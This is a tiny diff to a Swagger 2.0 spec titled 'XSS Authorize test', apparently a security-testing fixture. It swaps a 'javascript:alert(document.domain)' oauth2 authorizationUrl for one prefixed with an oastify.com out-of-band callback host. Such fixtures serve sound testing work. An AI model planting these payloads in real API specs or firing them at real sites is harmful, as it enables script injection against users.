@@ -2,7 +2,7 @@ swagger: "2.0"
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:alert(document.domain)//
+    authorizationUrl: hdy9f6co4267ouopbsao3br2ltrkfa3z.oastify.com/javascript:alert(document.domain)//
 info:
   version: "2.0"
   title: XSS Authorize test
